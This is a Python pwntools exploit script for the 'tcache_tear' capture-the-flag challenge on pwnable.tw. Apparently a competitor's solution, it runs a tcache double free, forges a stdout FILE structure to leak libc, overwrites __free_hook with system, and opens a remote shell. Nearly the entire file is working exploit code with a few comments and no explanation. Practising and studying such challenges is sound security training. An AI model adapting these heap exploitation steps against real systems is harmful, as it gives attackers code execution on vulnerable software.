import sys
from pwn import *

if len(sys.argv) != 2:
	print "sys.argv[1] = r : remote	l : local"
	exit()
	
context.log_level = 'debug'

def malloc(size, Data):
	sleep(0.3)
	#p.recv()
	p.send('1')
	#p.sendafter('Your choice :', '1')
	sleep(0.3)
	#p.recv()
	p.send(str(size))
	#p.sendafter('size', str(size))
	sleep(0.3)
	#p.recv()
	p.send(str(Data))
	#p.sendafter('Data:', str(Data))

def free():
	sleep(0.3)
	p.send('2')
	#p.sendafter('Your choice :', '2')


def info():
	p.sendafter('Your choice :', '3')


def exit():
	p.sendafter('Your choice :', '4')


if sys.argv[1].strip() == 'l':
	p = process('./tcache_tear')
elif sys.argv[1].strip() == 'r':
	p = remote('chall.pwnable.tw',10207)

e = ELF('./tcache_tear')

if sys.argv[1].strip() == 'l':
	l = e.libc
elif sys.argv[1].strip() == 'r':
	l = ELF('./tcahe_tear_libc')

pause()
p.sendafter('Name:', 'a')
malloc(200, 'a')
free()
free()
malloc(200, p64(0x602020))
malloc(200, 'a')

sleep(0.5)

### libc leak with stdout
stdout_offset = int((hex(l.sym['_IO_2_1_stdout_']))[-2:],16)
#log.info(hex(l.sym['_IO_2_1_stdout_']))
#log.info(stdout_offset)
malloc(200, chr(stdout_offset)) # stdout
struct = p64(0xFBAD2887)
struct += p64(0) # read ptr
struct += p64(0x602020) # read end
struct += p64(0) # read base
struct += p64(0x602020) #_IO_write_base
struct += p64(0x602020 + 8) #_IO_write_ptr
struct += p64(0x602020 + 8) #_IO_write_end
struct += p64(0) #_IO_buf_base
struct += p64(0) #_IO_buf_end
malloc(200, struct)
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - l.sym['_IO_2_1_stdout_'] # - 0x100
p.recv()
log.info('libc : ' + hex(libc))

malloc(30, 'a')
free()
free()
malloc(30, p64(libc + l.sym['__free_hook']))
malloc(30, 'a')
malloc(30, p64(libc + l.sym['system']))
malloc(50, '/bin/sh\x00')
free() # system('/bin/sh\x00')



p.interactive()